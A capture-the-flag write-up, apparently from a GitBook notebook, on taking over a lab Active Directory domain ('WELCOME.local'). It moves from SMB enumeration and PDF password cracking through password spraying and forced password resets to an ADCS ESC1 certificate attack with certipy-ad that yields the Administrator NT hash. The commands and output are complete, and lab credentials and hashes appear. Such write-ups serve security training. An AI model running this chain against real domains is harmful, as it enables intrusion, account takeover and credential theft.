---
cover: ../.gitbook/assets/58076149-f7c4-4405-ab3c-f1212b413026.png
coverY: 0
---

# Welcome(AD)

## Initial Enumeration:

* Starting Credentials

```
e.hills:Il0vemyj0b2025!
```

### NMAP :&#x20;

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-05 16:29:38Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:     2ded dae3 3ecd 1cc4 58a7 dd02 4f41 2b6d
| SHA-1:   aa01 7b70 2f48 f3c8 4aa0 5357 aeb8 93e9 8cbd 53bc
| SHA-256: 8735 4b7e c676 c67a 0ae7 73f7 d733 6d84 5e0b 2a4a 8723 8943 992a d0c3 b0bb f708
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:     2ded dae3 3ecd 1cc4 58a7 dd02 4f41 2b6d
| SHA-1:   aa01 7b70 2f48 f3c8 4aa0 5357 aeb8 93e9 8cbd 53bc
| SHA-256: 8735 4b7e c676 c67a 0ae7 73f7 d733 6d84 5e0b 2a4a 8723 8943 992a d0c3 b0bb f708
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:     2ded dae3 3ecd 1cc4 58a7 dd02 4f41 2b6d
| SHA-1:   aa01 7b70 2f48 f3c8 4aa0 5357 aeb8 93e9 8cbd 53bc
| SHA-256: 8735 4b7e c676 c67a 0ae7 73f7 d733 6d84 5e0b 2a4a 8723 8943 992a d0c3 b0bb f708
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.WELCOME.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.WELCOME.local
| Issuer: commonName=WELCOME-CA/domainComponent=WELCOME
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-13T16:39:47
| Not valid after:  2026-09-13T16:39:47
| MD5:     2ded dae3 3ecd 1cc4 58a7 dd02 4f41 2b6d
| SHA-1:   aa01 7b70 2f48 f3c8 4aa0 5357 aeb8 93e9 8cbd 53bc
| SHA-256: 8735 4b7e c676 c67a 0ae7 73f7 d733 6d84 5e0b 2a4a 8723 8943 992a d0c3 b0bb f708
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WELCOME
|   NetBIOS_Domain_Name: WELCOME
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: WELCOME.local
|   DNS_Computer_Name: DC01.WELCOME.local
|   DNS_Tree_Name: WELCOME.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-05T16:30:39+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

#### SMB(135,139,445):

* We check the shares accessible to the Initial User provided to us

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ nxc smb WELCOME.local -u e.hills -p 'Il0vemyj0b2025!' --shares                                             
SMB         10.1.84.158     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False) 
SMB         10.1.84.158     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025! 
SMB         10.1.84.158     445    DC01             [*] Enumerated shares
SMB         10.1.84.158     445    DC01             Share           Permissions     Remark
SMB         10.1.84.158     445    DC01             -----           -----------     ------
SMB         10.1.84.158     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.84.158     445    DC01             C$                              Default share
SMB         10.1.84.158     445    DC01             Human Resources READ            
SMB         10.1.84.158     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.84.158     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.84.158     445    DC01             SYSVOL          READ            Logon server share 
```

* The `Human Resources` share seems suspicious and out of the ordinary so we connect to it using `smbclient`.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ smbclient //10.1.84.158/"HUMAN Resources"  -U 'e.hills'
Password for [WORKGROUP\e.hills]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep 13 19:20:17 2025
  ..                                  D        0  Sat Sep 13 16:11:19 2025
  Welcome 2025 Holiday Schedule.pdf      A    84715  Sat Sep 13 18:18:12 2025
  Welcome Benefits.pdf                A    81466  Sat Sep 13 18:18:12 2025
  Welcome Handbook Excerpts.pdf       A    82644  Sat Sep 13 18:18:12 2025
  Welcome Performance Review Guide.pdf      A    79823  Sat Sep 13 18:18:12 2025
  Welcome Start Guide.pdf             A    89511  Sat Sep 13 18:18:12 2025

                15568127 blocks of size 4096. 12061856 blocks available
smb: \> get Welcome Performance Review Guide.pdf
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Welcome
smb: \> mget *
Get file Welcome 2025 Holiday Schedule.pdf? y
getting file \Welcome 2025 Holiday Schedule.pdf of size 84715 as Welcome 2025 Holiday Schedule.pdf (57.0 KiloBytes/sec) (average 57.0 KiloBytes/sec)
Get file Welcome Benefits.pdf? y
getting file \Welcome Benefits.pdf of size 81466 as Welcome Benefits.pdf (73.3 KiloBytes/sec) (average 64.0 KiloBytes/sec)
Get file Welcome Handbook Excerpts.pdf? y
getting file \Welcome Handbook Excerpts.pdf of size 82644 as Welcome Handbook Excerpts.pdf (75.0 KiloBytes/sec) (average 67.3 KiloBytes/sec)
Get file Welcome Performance Review Guide.pdf? y
getting file \Welcome Performance Review Guide.pdf of size 79823 as Welcome Performance Review Guide.pdf (78.0 KiloBytes/sec) (average 69.6 KiloBytes/sec)
Get file Welcome Start Guide.pdf? y
getting file \Welcome Start Guide.pdf of size 89511 as Welcome Start Guide.pdf (26.2 KiloBytes/sec) (average 51.4 KiloBytes/sec)
smb: \> 
```

* During our enumeration we download all the PDF files from the `Human Resources` share and one of the file which was `Welcome Start Guide.pdf` was password protected so we used `pdf2john.py` to get the hash.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ pdf2john 'Welcome Start Guide.pdf' > hash.txt
```

* Now we crack the retrieved hash using `john`

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
humanresources   (Welcome Start Guide.pdf)     
1g 0:00:00:05 DONE (2026-02-05 12:26) 0.1692g/s 157108p/s 157108c/s 157108C/s humphrey06..huitar
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 

```

* We successfully cracked the hash and got the password, Now we can open the PDF file.
* After opening the PDF, we see a cleartext Password GIven.

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

* Now we also enumerated the users in the Domain using `nxc`

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ nxc smb 10.1.84.158 -u e.hills -p 'Il0vemyj0b2025!' --users                                                    
SMB         10.1.84.158     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False) 
SMB         10.1.84.158     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025! 
SMB         10.1.84.158     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.84.158     445    DC01             Administrator                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain 
SMB         10.1.84.158     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.84.158     445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account 
SMB         10.1.84.158     445    DC01             e.hills                       2025-09-13 20:41:15 0        
SMB         10.1.84.158     445    DC01             j.crickets                    2025-09-13 20:43:53 0        
SMB         10.1.84.158     445    DC01             e.blanch                      2025-09-13 20:49:13 0        
SMB         10.1.84.158     445    DC01             i.park                        2025-09-14 04:23:03 0       IT Intern 
SMB         10.1.84.158     445    DC01             j.johnson                     2025-09-13 20:58:15 0        
SMB         10.1.84.158     445    DC01             a.harris                      2025-09-13 20:59:13 0        
SMB         10.1.84.158     445    DC01             svc_ca                        2025-09-14 00:19:35 0        
SMB         10.1.84.158     445    DC01             svc_web                       2025-09-13 21:40:40 0       Web Server in Progress 
SMB         10.1.84.158     445    DC01             [*] Enumerated 11 local users: WELCOME

```

* We created a `users.txt` file which contained all the users in the domain

## Shell as `a.harris` :&#x20;

* We password sprayed the retrieved password across the users and got a hit on user `a.harris`.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ nxc smb 10.1.84.158 -u users.txt -p 'Welcome2025!@'                                                       
SMB         10.1.84.158     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False) 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\Administrator:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\krbtgt:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\e.hills:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\j.crickets:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\e.blanch:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\i.park:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [-] WELCOME.local\j.johnson:Welcome2025!@ STATUS_LOGON_FAILURE 
SMB         10.1.84.158     445    DC01             [+] WELCOME.local\a.harris:Welcome2025!@ 

```

* We then checked if this user had `winrm` access  using `nxc` and We got a positive hit so we connected using `evil-winrm` .

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

* Here we got our `user.txt` which was the user flag.
* After getting user flag we check the Bloodhound data and Analyze that the user `a.harris` has an outbound obect control `GenericAll` over `I.PARK`.

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

## Access as `I.park` :&#x20;

* So we now did a force change password for user `I.PARK` by our controlled user `a.harris`

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ net rpc password "I.PARK" "newP@ssword2022" -U "WELCOME.local"/"a.harris"%'Welcome2025!@' -S "DC01.WELCOME.local"
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ nxc smb 10.1.84.158 -u 'I.PARK' -p 'newP@ssword2022'                                                             
SMB         10.1.84.158     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False) 
SMB         10.1.84.158     445    DC01             [+] WELCOME.local\I.PARK:newP@ssword2022 

```

* Next we see that this user has a `forcechangepassword` over `SVC_CA` which seemed like a certificate authority to us and seemed like ADCS abuse would be our path.
* We go ahead and abuse the `ForceChangePassword` file and reset the user `SVC_CA` password.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ net rpc password "SVC_CA" "newP@ssword2022" -U "WELCOME.local"/"I.PARK"%'newP@ssword2022' -S "DC01.WELCOME.local"
```

## Shell as `Administrator` :&#x20;

* Now we enumerated the certificate template using `certipy-ad`

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ certipy-ad find -u 'SVC_CA' -p 'newP@ssword2022'  -dc-ip 10.1.84.158 -enabled -vuln -ldap-scheme ldap -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'WELCOME-CA' via RRP
[*] Successfully retrieved CA configuration for 'WELCOME-CA'
[*] Checking web enrollment for CA 'WELCOME-CA' @ 'DC01.WELCOME.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : WELCOME-CA
    DNS Name                            : DC01.WELCOME.local
    Certificate Subject                 : CN=WELCOME-CA, DC=WELCOME, DC=local
    Certificate Serial Number           : 6E7A025A45F4E6A14E1F08B77737AFD9
    Certificate Validity Start          : 2025-09-13 16:39:33+00:00
    Certificate Validity End            : 2030-09-13 16:49:33+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : WELCOME.LOCAL\Administrators
      Access Rights
        ManageCa                        : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        ManageCertificates              : WELCOME.LOCAL\Administrators
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Enroll                          : WELCOME.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : Welcome-Template
    Display Name                        : Welcome-Template
    Certificate Authorities             : WELCOME-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-14T03:12:52+00:00
    Template Last Modified              : 2025-10-30T02:19:35+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WELCOME.LOCAL\svc ca
                                          WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : WELCOME.LOCAL\Administrator
        Full Control Principals         : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Write Owner Principals          : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Write Dacl Principals           : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
        Write Property Enroll           : WELCOME.LOCAL\Domain Admins
                                          WELCOME.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : WELCOME.LOCAL\svc ca
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

* We identified right there is an `ESC1` template vulnerability which escalates our privileges to domain admin.
* We went and abused this Vulnerability using `certipy-ad` and Request a Certificate for Administrator.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ certipy-ad req -debug -u 'SVC_CA@WELCOME.LOCAL' -p 'newP@ssword2022' -dc-ip 10.1.84.158 -target 10.1.84.158 -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.LOCAL' -sid 'S-1-5-21-141921413-1529318470-1830575104-500'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.1.84.158'
[+] DC IP: '10.1.84.158'
[+] DC Host: 'WELCOME.LOCAL'
[+] Target IP: '10.1.84.158'
[+] Remote Name: '10.1.84.158'
[+] Domain: 'WELCOME.LOCAL'
[+] Username: 'SVC_CA'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.1.84.158[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.1.84.158[\pipe\cert]
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@WELCOME.LOCAL'
[+] Found SID in SAN URL: 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Certificate object SID is 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

* Now we use the `administrator.pfx` file to authenticate and retrieve the NTLM Hash.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/Welcome]
└─$ certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.1.84.158
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.1.84.158'
[+] DC IP: '10.1.84.158'
[+] DC Host: ''
[+] Target IP: '10.1.84.158'
[+] Remote Name: '10.1.84.158'
[+] Domain: ''
[+] Username: ''
[*] Certificate identities:
[*]     SAN UPN: 'administrator@WELCOME.LOCAL'
[*]     SAN URL SID: 'S-1-5-21-141921413-1529318470-1830575104-500'
[+] Found SID in SAN URL: 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC welcome.local (10.1.84.158)
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[+] Attempting to write data to 'administrator.ccache'
[+] Data written to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a

```

* Here We Got the Administrator Hash and Now we can WinRM as Administrator and get the flag.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* We now have successfully solved this machine!!!
